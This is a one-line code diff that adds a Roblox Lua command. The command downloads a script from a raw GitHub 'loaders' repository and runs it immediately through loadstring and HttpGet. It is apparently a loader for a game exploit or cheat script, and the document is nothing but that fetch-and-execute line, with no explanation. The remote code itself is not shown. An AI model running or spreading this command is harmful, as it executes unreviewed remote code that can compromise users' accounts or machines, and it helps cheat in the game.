@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/god-simulation-sandbox-modern-age-update-spam3-95g6daipodjimw.lua"))()
